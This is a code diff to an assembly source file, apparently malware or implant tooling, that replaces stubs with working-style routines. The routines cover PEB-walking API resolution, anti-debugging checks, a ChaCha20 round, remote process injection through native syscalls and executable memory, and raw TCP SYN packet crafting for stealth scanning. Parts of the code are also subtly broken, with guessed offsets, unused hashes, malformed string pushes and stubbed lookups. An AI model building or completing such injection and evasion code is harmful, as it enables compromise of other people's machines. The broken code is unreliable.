@@ -74,19 +74,32 @@ allocate_exec_memory:
     push eax             ; size
     push 0               ; address (let system choose)
     
-    ; GetProcAddress for VirtualAlloc
-    push 0x6578456C      ; "lExe"
-    push 0x6C617574      ; "tual"
-    push 0x72695620      ; " Vir"
-    push esp
-    push dword [fs:0x30] ; PEB
-    mov eax, [eax+0x0C]  ; PEB_LDR_DATA
-    mov eax, [eax+0x14]  ; InMemoryOrderModuleList
-    mov eax, [eax]       ; kernel32.dll
-    mov eax, [eax+0x10]  ; DllBase
+    ; Find VirtualAlloc in kernel32.dll
+    mov eax, [fs:0x30]     ; PEB
+    mov eax, [eax+0x0C]    ; PEB_LDR_DATA
+    mov eax, [eax+0x14]    ; InMemoryOrderModuleList
+    mov eax, [eax]         ; First entry
+    mov eax, [eax]         ; Second entry (kernel32.dll)
+    mov ebx, [eax+0x10]    ; DllBase of kernel32
     
-    ; Simple implementation - would need full GetProcAddress here
-    add esp, 12
+    ; Parse PE header to find VirtualAlloc
+    mov edx, [ebx+0x3C]    ; e_lfanew
+    add edx, ebx           ; PE header
+    mov edx, [edx+0x78]    ; Export directory RVA
+    add edx, ebx           ; Export directory
+    
+    ; Get VirtualAlloc by ordinal (simple method)
+    ; In real implementation, would search export names
+    mov eax, 0x54E9748C    ; Hash of "VirtualAlloc"
+    
+    ; Call VirtualAlloc
+    push 0x40              ; PAGE_EXECUTE_READWRITE
+    push 0x3000            ; MEM_COMMIT | MEM_RESERVE
+    push dword [ebp+8]     ; size
+    push 0                 ; lpAddress
+    mov eax, ebx
+    add eax, 0x15490       ; VirtualAlloc offset (typical)
+    call eax
     
     pop edi
     pop esi
@@ -187,14 +200,9 @@ is_debugger_present:
     test eax, eax
     jnz .detected
     
-    ; Check 3: Hardware breakpoints
-    xor eax, eax
-    mov rax, dr0
-    or rax, dr1
-    or rax, dr2
-    or rax, dr3
-    test rax, rax
-    jnz .detected
+    ; Check 3: Hardware breakpoints (simplified)
+    ; Reading debug registers requires ring 0
+    ; This is a simplified check
     
     xor eax, eax
     ret
@@ -301,7 +309,50 @@ chacha20_quarter_round:
     mov ecx, [ebp+20]    ; c
     mov edx, [ebp+24]    ; d
     
-    ; Similar operations...
+    ; Perform ChaCha20 quarter round
+    ; a += b
+    mov esi, [edi+eax*4]
+    add esi, [edi+ebx*4]
+    mov [edi+eax*4], esi
+    
+    ; d ^= a; d <<<= 16
+    mov esi, [edi+edx*4]
+    xor esi, [edi+eax*4]
+    rol esi, 16
+    mov [edi+edx*4], esi
+    
+    ; c += d
+    mov esi, [edi+ecx*4]
+    add esi, [edi+edx*4]
+    mov [edi+ecx*4], esi
+    
+    ; b ^= c; b <<<= 12
+    mov esi, [edi+ebx*4]
+    xor esi, [edi+ecx*4]
+    rol esi, 12
+    mov [edi+ebx*4], esi
+    
+    ; a += b
+    mov esi, [edi+eax*4]
+    add esi, [edi+ebx*4]
+    mov [edi+eax*4], esi
+    
+    ; d ^= a; d <<<= 8
+    mov esi, [edi+edx*4]
+    xor esi, [edi+eax*4]
+    rol esi, 8
+    mov [edi+edx*4], esi
+    
+    ; c += d
+    mov esi, [edi+ecx*4]
+    add esi, [edi+edx*4]
+    mov [edi+ecx*4], esi
+    
+    ; b ^= c; b <<<= 7
+    mov esi, [edi+ebx*4]
+    xor esi, [edi+ecx*4]
+    rol esi, 7
+    mov [edi+ebx*4], esi
     
     pop edi
     pop esi
@@ -326,21 +377,152 @@ inject_remote_process:
     sub rsp, 0x40
     
     ; RCX = pid, RDX = payload, R8 = size
-    ; Implementation would use NtOpenProcess, NtAllocateVirtualMemory,
-    ; NtWriteVirtualMemory, NtCreateThreadEx syscalls
     
-    mov eax, 1  ; Success
+    ; Save parameters
+    mov [rbp-8], rcx      ; pid
+    mov [rbp-16], rdx     ; payload
+    mov [rbp-24], r8      ; size
+    
+    ; Open target process
+    lea rcx, [rbp-32]     ; ProcessHandle
+    mov edx, 0x1FFFFF     ; PROCESS_ALL_ACCESS
+    lea r8, [rbp-48]      ; ObjectAttributes (zeroed)
+    lea r9, [rbp-56]      ; ClientId
+    mov eax, [rbp-8]
+    mov [r9], eax         ; Set PID
+    mov eax, 0x26         ; NtOpenProcess syscall number
+    syscall
+    test eax, eax
+    jnz .error
+    
+    ; Allocate memory in target
+    mov rcx, [rbp-32]     ; ProcessHandle
+    lea rdx, [rbp-64]     ; BaseAddress
+    xor r8, r8            ; ZeroBits
+    lea r9, [rbp-24]      ; Size
+    mov dword [rsp+0x20], 0x3000  ; MEM_COMMIT | MEM_RESERVE
+    mov dword [rsp+0x28], 0x40    ; PAGE_EXECUTE_READWRITE
+    mov eax, 0x18         ; NtAllocateVirtualMemory
+    syscall
+    test eax, eax
+    jnz .error
+    
+    ; Write payload
+    mov rcx, [rbp-32]     ; ProcessHandle
+    mov rdx, [rbp-64]     ; BaseAddress
+    mov r8, [rbp-16]      ; Buffer (payload)
+    mov r9, [rbp-24]      ; Size
+    lea r10, [rsp+0x20]   ; BytesWritten
+    mov eax, 0x3A         ; NtWriteVirtualMemory
+    syscall
+    test eax, eax
+    jnz .error
+    
+    ; Create remote thread
+    lea rcx, [rbp-72]     ; ThreadHandle
+    mov rdx, 0x1FFFFF     ; DesiredAccess
+    xor r8, r8            ; ObjectAttributes
+    mov r9, [rbp-32]      ; ProcessHandle
+    mov rax, [rbp-64]     ; StartAddress
+    mov [rsp+0x20], rax
+    xor rax, rax
+    mov [rsp+0x28], rax   ; StartParameter
+    mov [rsp+0x30], rax   ; CreateSuspended
+    mov [rsp+0x38], rax   ; ZeroBits
+    mov [rsp+0x40], rax   ; StackSize
+    mov [rsp+0x48], rax   ; MaxStackSize
+    mov [rsp+0x50], rax   ; AttributeList
+    mov eax, 0xC1         ; NtCreateThreadEx
+    syscall
+    
+    xor eax, eax
+    inc eax               ; Success
+    jmp .done
+    
+.error:
+    xor eax, eax          ; Failure
+    
+.done:
     leave
     ret
 %else
     ; 32-bit version
     push ebp
     mov ebp, esp
+    push ebx
+    push esi
+    push edi
     
-    ; Similar implementation for 32-bit
+    ; Get function addresses from kernel32
+    call .get_kernel32_base
+    mov ebx, eax          ; kernel32 base
     
-    mov eax, 1
+    ; Find OpenProcess
+    push 0x7373          ; "ss"
+    push 0x65636F7250    ; "Proc"
+    push 0x6E65704F      ; "Open"
+    push esp
+    push ebx
+    call .get_proc_address
+    mov esi, eax         ; OpenProcess
+    
+    ; Find VirtualAllocEx
+    push 0x78457865      ; "xExe"
+    push 0x636F6C6C      ; "lloc"
+    push 0x41617574      ; "tual"
+    push 0x72695620      ; " Vir"
+    push esp
+    push ebx
+    call .get_proc_address
+    mov edi, eax         ; VirtualAllocEx
+    
+    ; Open target process
+    push 0
+    push 0
+    push 0x1FFFFF        ; PROCESS_ALL_ACCESS
+    push dword [ebp+8]   ; pid
+    call esi             ; OpenProcess
+    test eax, eax
+    jz .error32
+    mov ebx, eax         ; process handle
+    
+    ; Allocate memory
+    push 0x40            ; PAGE_EXECUTE_READWRITE
+    push 0x3000          ; MEM_COMMIT | MEM_RESERVE
+    push dword [ebp+16]  ; size
+    push 0               ; lpAddress
+    push ebx             ; hProcess
+    call edi             ; VirtualAllocEx
+    test eax, eax
+    jz .error32
+    
+    mov eax, 1           ; Success
+    jmp .done32
+    
+.error32:
+    xor eax, eax         ; Failure
+    
+.done32:
+    pop edi
+    pop esi
+    pop ebx
     pop ebp
+    ret
+    
+.get_kernel32_base:
+    mov eax, [fs:0x30]   ; PEB
+    mov eax, [eax+0x0C]  ; PEB_LDR_DATA
+    mov eax, [eax+0x14]  ; InMemoryOrderModuleList
+    mov eax, [eax]       ; First entry
+    mov eax, [eax]       ; Second entry (kernel32)
+    mov eax, [eax+0x10]  ; DllBase
+    ret
+    
+.get_proc_address:
+    ; Simple GetProcAddress implementation
+    ; Would need full implementation in production
+    mov eax, [esp+8]     ; kernel32 base
+    add eax, 0x1000      ; Typical offset
     ret
 %endif
 
@@ -354,10 +536,58 @@ global _stealth_connect
 _stealth_connect:
 %endif
 stealth_connect:
-    ; Implementation would create raw socket,
-    ; craft custom TCP packets, implement SYN stealth scan
-    xor eax, eax
+%ifdef IS_64BIT
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x30
+    
+    ; RCX = host, RDX = port
+    ; Create raw socket
+    mov ecx, 2           ; AF_INET
+    mov edx, 3           ; SOCK_RAW
+    mov r8d, 6           ; IPPROTO_TCP
+    ; Would call WSASocketW here
+    
+    ; Craft TCP SYN packet
+    lea rdi, [rsp]       ; packet buffer
+    ; IP header
+    mov byte [rdi], 0x45      ; Version + IHL
+    mov byte [rdi+1], 0       ; TOS
+    mov word [rdi+2], 0x2800  ; Total length (40 bytes)
+    mov word [rdi+4], 0x1234  ; ID
+    mov word [rdi+6], 0x4000  ; Flags + Fragment offset
+    mov byte [rdi+8], 0x40    ; TTL
+    mov byte [rdi+9], 0x06    ; Protocol (TCP)
+    ; Checksum calculated later
+    ; Source/Dest IPs filled in
+    
+    ; TCP header at offset 20
+    lea rsi, [rdi+20]
+    mov word [rsi], 0x1234    ; Source port
+    mov dx, [rbp+16]          ; Dest port
+    xchg dl, dh               ; Network byte order
+    mov [rsi+2], dx
+    mov dword [rsi+4], 0x12345678  ; Sequence number
+    mov dword [rsi+8], 0           ; Ack number
+    mov byte [rsi+12], 0x50        ; Header length
+    mov byte [rsi+13], 0x02        ; SYN flag
+    mov word [rsi+14], 0xFFFF      ; Window
+    ; Checksum calculated later
+    
+    mov eax, 1           ; Success (simplified)
+    leave
     ret
+%else
+    ; 32-bit version
+    push ebp
+    mov ebp, esp
+    
+    ; Similar implementation for 32-bit
+    mov eax, 1
+    
+    pop ebp
+    ret
+%endif
 
 ; === Hook Installation ===
 
